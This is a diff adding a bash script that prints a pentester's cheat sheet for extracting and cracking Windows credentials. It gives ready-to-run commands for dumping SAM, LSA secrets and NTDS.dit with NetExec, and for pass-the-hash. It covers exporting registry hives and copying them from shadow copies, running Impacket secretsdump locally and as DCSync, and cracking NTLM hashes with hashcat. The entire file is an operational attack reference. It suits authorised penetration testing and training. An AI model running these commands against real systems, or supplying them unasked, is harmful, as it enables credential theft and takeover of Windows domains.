@@ -1,0 +1,49 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── SAM — EXTRACTION & CRACKING ─────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Remote (nxc — preferred) ─────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> --sam${NC}        # SAM (local hashes)"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> --lsa${NC}        # LSA secrets"
+echo -e "  ${GREEN}nxc smb <DC_IP>  -u <USER> -p <PASS> --ntds${NC}       # NTDS.dit (DC only)"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -H <NTLM> --local-auth --sam${NC}  # PTH"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Local Extraction (requires admin) ────────────────${NC}"
+echo -e "  Note: Registry export"
+echo -e "  ${GREEN}reg save HKLM\\SAM 'C:\Temp\sam'${NC}"
+echo -e "  ${GREEN}reg save HKLM\\SYSTEM 'C:\Temp\system'${NC}"
+echo -e "  ${GREEN}reg save HKLM\\SECURITY 'C:\Temp\security'${NC}"
+printf "\n"
+echo -e "  Note: Volume Shadow Copy"
+echo -e "  ${GREEN}wmic shadowcopy call create Volume='C:\'${NC}"
+echo -e "  ${GREEN}vssadmin list shadows${NC}"
+echo -e "  ${GREEN}copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam 'C:\Temp\sam'${NC}"
+echo -e "  ${GREEN}copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system 'C:\Temp\system'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Parse Offline (Impacket) ─────────────────────────${NC}"
+echo -e "  ${GREEN}impacket-secretsdump -sam sam -system system -security security LOCAL${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Remote Secretsdump (Alt) ─────────────────────────${NC}"
+echo -e "  ${GREEN}impacket-secretsdump -outputfile dcsync -dc-ip <DC_IP> DOMAIN/user:pass@<DC>${NC}"
+echo -e "  ${GREEN}impacket-secretsdump -hashes :<NT_HASH> -dc-ip <DC_IP> DOMAIN/user@<DC>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Crack NTLM Hashes ────────────────────────────────${NC}"
+echo -e "  Note: Format from secretsdump: user:RID:LMhash:NThash::: — take 4th field"
+echo -e "  ${GREEN}cat ntlm.txt | awk -F: '{print \$4}' > hashes.txt${NC}"
+echo -e "  ${GREEN}hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
